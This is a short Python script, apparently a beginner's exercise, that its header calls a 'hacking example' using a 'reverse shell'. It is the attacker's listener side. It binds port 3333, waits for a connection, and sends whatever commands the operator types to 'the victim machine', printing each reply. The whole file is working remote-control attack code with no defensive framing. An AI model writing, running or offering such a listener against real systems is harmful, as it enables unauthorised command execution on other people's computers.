# WORKS. SINGLE CONNECTION. SEND AN REVEICE DATA EXAMPLE. HACKING EXAMPLE. METHOD CALLED REVERSE SHELL.

import socket
import sys
import os
def creatSocket():
    global host
    global port
    global s #socket
    host = ""
    port = 3333
    print("creating socket...")
    try:
        s = socket.socket()
    except socket.error as err:
        print("error occured in creating a socket! \n error: " + err)

def bind():
    print("binding the port and host to the socket...")

    global host
    global port
    global s
    try:
        s.bind((host,port))
        print("binding complete. now listening...")
        s.listen(5)  #work unitl 5 bad connections
    except socket.error as err:
        print("error in binding (or maybe in listening)! it says: "+err)

def accept(send_func):
    global host
    global port
    global s
    connection,address = s.accept()
    print(f"connected to IP {address[0]} and port {address[1]}")
    send_func(connection)
    connection.close()   #close the conncection


def send_hack(connection):
    """connection parameter reperesents the conncetion,address = s.accept"""
    global host
    global port
    global s
    while True:
        commands = input("enter the commands to send to the victim machine: ")
        if commands == "exit":

            connection.close()
            s.close()
            sys.exit()
        commands_send = str.encode(commands)
        if len(commands_send) >0:
            print(f"sneding the command {commands} as {commands_send}")
            connection.send(commands_send) #sending the data
            client_response = str(connection.recv(1024),"utf-8")
            print(f"clinet response: {client_response}",end="")




creatSocket()
bind()
accept(send_hack)



